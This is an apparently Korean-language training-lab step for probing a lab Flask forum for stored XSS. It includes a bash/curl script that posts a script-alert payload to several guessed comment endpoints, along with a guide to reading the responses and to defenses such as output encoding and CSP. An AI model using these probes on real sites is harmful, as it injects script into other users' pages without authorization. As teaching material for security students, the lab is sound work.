  - order: 2
    instruction: |
      ## 🎯 MISSION — MediForum (Flask) Stored XSS 시도

      MediForum (Werkzeug/Python Flask) 의 *댓글 form* 에 XSS payload 저장 시도.
      JuiceShop 의 *Reflected* vs MediForum 의 *Stored* 비교.

      ## 📚 사전 학습 (학생 혼돈 방지)

      - **Stored XSS** = DB 저장 → *모든 user* 의 페이지 로딩 시 실행
      - **endpoint** = `/comment` 또는 `/post` 또는 `/api/posts/.../comments`
      - **JuiceShop 와 차이** = Stored 는 *공격 1 회 → N user 영향*
      - **방어 표준** = output encoding (htmlspecialchars) + CSP

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker bash <<'SH'
      # 1) MediForum 의 endpoint 탐색
      echo "=== MediForum index ==="
      curl -s -H 'Host: mediforum.6v6.lab' http://10.20.30.1/ 2>&1 | grep -E 'form|action=|comment|post' | head -10

      # 2) Stored XSS 시도 (가상 endpoint)
      for endpoint in /comment /api/comments /post /api/posts; do
        code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
          -H 'Host: mediforum.6v6.lab' \
          -H 'Content-Type: application/json' \
          -d '{"content":"<script>alert(1)</script>","author":"test"}' \
          "http://10.20.30.1$endpoint")
        echo "$endpoint: $code"
      done
      SH
      ```

      ## 📋 확인 사항

      - MediForum 의 endpoint 식별 (form action 또는 API path)
      - Stored XSS 의 *저장 응답* (200/201 = 저장 / 400 = parse / 403 = WAF)
      - 저장 시 의 *후속 조회* 시 XSS 실행 가능 여부

      ## 💡 왜 이걸 하는가?

      Stored XSS = *최대 영향* (1 공격 → N user). MediForum 의 *공개 forum* 가 *대표
      target*.

      ## 🔍 결과 해석

      - **403 (WAF 차단)**: ModSec 941 의 XSS 패턴 차단
      - **201 (저장 OK)**: input validation 없음 — 즉시 *output encoding* 권장
      - **404 (endpoint X)**: 다른 path 탐색

      ## 비정상 시 대응

      - **모든 endpoint 404**: HTML form 분석 후 *실 path* 추출 (Burp 또는 brutezone)
      - **Content-Type 다름**: `application/x-www-form-urlencoded` 또는 `multipart/form-data`
